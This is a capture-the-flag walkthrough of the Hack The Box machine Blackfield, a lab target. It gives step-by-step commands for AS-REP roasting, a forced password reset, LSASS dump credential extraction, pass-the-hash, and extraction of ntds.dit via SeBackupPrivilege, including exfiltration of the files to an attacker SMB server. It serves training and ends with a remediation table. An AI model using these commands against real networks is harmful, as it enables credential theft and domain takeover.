# Blackfield — LSASS on a share, ntds.dit via SeBackupPrivilege

[![Difficulty](https://img.shields.io/badge/difficulty-Hard-orange)](https://app.hackthebox.com/machines/blackfield)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/blackfield)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=IfCysW0Od8w)

> **Attack path:** Null-session `profiles$` share → user list → AS-REP Roast `support` → BloodHound: `support` can force-reset `audit2020`'s password → `forensic$` share → lsass minidump → `pypykatz` → `svc_backup` NT hash → WinRM → **SeBackupPrivilege** → shadow-copy `ntds.dit` + SYSTEM hive → `secretsdump.py` → Administrator.

A hard AD box that never needs an exploit — just layered credential exposure, one edge in BloodHound, and a backup operator doing backups a little too well.

## 1 · Reconnaissance

```bash
echo "10.10.10.192 blackfield.local dc01" | sudo tee -a /etc/hosts

nmap -p- --min-rate 10000 -oN blackfield-allports 10.10.10.192
nmap -p 53,88,135,139,389,445,464,593,636,3268,5985 -sCV -oN blackfield-tcpsvc 10.10.10.192
```

Domain `BLACKFIELD.local`, host `DC01`, the usual DC services. No web, no SMB shares readable except one anonymous gem.

### Harvesting usernames from profiles$

`smbclient` anonymously lists the **`profiles$`** share — 300+ empty home folders, one per user:

```bash
smbclient -N //10.10.10.192/profiles$ -c 'ls' | awk '{print $1}' | grep -v '\$' > users.txt
```

Notable entries: `support`, `svc_backup`, `audit2020`.

## 2 · Foothold

### AS-REP Roasting

Feed the harvested list back into the standard roast loop:

```bash
for u in $(cat users.txt); do
  GetNPUsers.py -no-pass -dc-ip 10.10.10.192 "blackfield.local/$u" | grep 'krb5asrep'
done
```

Only `support` has pre-auth disabled:

```bash
hashcat -m 18200 support.asrep /usr/share/wordlists/rockyou.txt
# support:<password>
```

Check access paths — `support` works over **SMB/RPC only** (no WinRM):

```bash
netexec smb 10.10.10.192 -u support -p '<password>' --shares
netexec winrm 10.10.10.192 -u support -p '<password>'   # (pwn3d! does NOT appear)
```

### BloodHound edge → password reset

```bash
bloodhound-python -c All -u support -p '<password>' -d blackfield.local \
  -dc dc01.blackfield.local -ns 10.10.10.192
```

The graph shows `support` holds **ForceChangePassword over `audit2020`**. Reset it over RPC:

```bash
rpcclient -U 'blackfield.local/support%<password>' 10.10.10.192 \
  -c 'setuserinfo2 audit2020 23 "<new-password>"'
```

### The forensic share → lsass dump

As `audit2020` we suddenly have READ on the **`forensic$`** share, which contains a memory-forensics goodie bag:

```bash
smbclient //10.10.10.192/forensic$ -U 'blackfield.local\audit2020%<new-password>'
smb: \memory_analysis\> ls
lsass.zip   # 137 MB — a minidump of LSASS
smb: \memory_analysis\> get lsass.zip
```

## 3 · User flag

### Mining the dump with pypykatz

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

Among the cached logon sessions sits `svc_backup` with its **NT hash** (`NT: <hash>`).

### WinRM as svc_backup

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H <hash>
```

```powershell
*Evil-WinRM* PS C:\> whoami /priv
SeBackupPrivilege        # and SeRestorePrivilege — Backup Operators member
SeRestorePrivilege

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
<flag>
```

## 4 · Privilege escalation

`SeBackupPrivilege` = "read any file, bypassing ACLs". The file we want is `C:\Windows\NTDS\ntds.dit` — locked while the DC runs, so snapshot it first.

### Step 1 — shadow copy with diskshadow

Write `C:\programdata\vss.dsh` (use `unix2dos` on an uploaded script, CRLF matters):

```text
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

```powershell
diskshadow /s c:\programdata\vss.dsh
```

### Step 2 — copy ntds.dit + SYSTEM hive out

The copy needs backup-aware helpers (giuliano108's `SeBackupPrivilege` PowerShell module, or `robocopy /B`):

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdlets.dll   # provides Copy-FileSeBackupPrivilege
Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit c:\programdata\ntds.dit
reg.exe save hklm\system c:\programdata\system
```

Then exfiltrate both files to your box (`smbserver.py s . -smb2support -username u -password p` + `net use`), and dump offline:

```bash
secretsdump.py -system system -ntds ntds.dit LOCAL
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>:::
```

## 5 · Root flag / Domain Admin

```bash
evil-winrm -i 10.10.10.192 -u administrator -H <hash>
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<flag>
```

Note: root.txt is EFS-encrypted — readable only in the Administrator's logon session (a plain SeBackupPrivilege read of the file returns ciphertext; the ntds.dit route is the intended path).

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Domain user list exposed via anonymous `profiles$` share | Free reconnaissance target list for roasting/spraying | Remove anonymous share listing; enable "Network access: Do not allow anonymous enumeration of SAM accounts and shares" |
| AS-REP roastable `support` account with weak password | First credentials cracked offline | Enable Kerberos pre-auth; enforce strong passphrase policy |
| Helpdesk-style user with ForceChangePassword on other users | Lateral credential takeover without knowing the target's password | Scope delegated password-reset rights to a narrow helpdesk group with monitoring |
| LSASS minidump stored on a world-readable share (`forensic$`) | Full credential recovery with `pypykatz` (NT hashes of privileged accounts) | Never persist memory dumps on shares; purge + access-gate forensic artifacts; enable credential guard/run-as-PPL |
| Backup Operators membership grants SeBackupPrivilege on a DC | Any such account can extract `ntds.dit` and own the domain | Backup operator = tier-0; separate credentials, monitoring, no interactive DC logon for service accounts |

## 7 · CPTS takeaways

- Enumerate **shares first with null credentials** — `profiles$` quietly solves user enumeration on boxes where RPC is locked down.
- The BloodHound edge worth memorizing: **ForceChangePassword** + `rpcclient setuserinfo2` for password resets without the old password.
- LSASS dump triage with `pypykatz lsa minidump` — pass-the-hash straight from a share-hosted file.
- **SeBackupPrivilege on a DC** = ntds.dit exfiltration: `diskshadow` → `Copy-FileSeBackupPrivilege`/`robocopy /B` → `secretsdump.py -system -ntds LOCAL`.
- Chained credential hygiene failures (roastable account → reset edge → leaked dump → over-privileged group) model exactly how the CPTS AD set wants you to think.
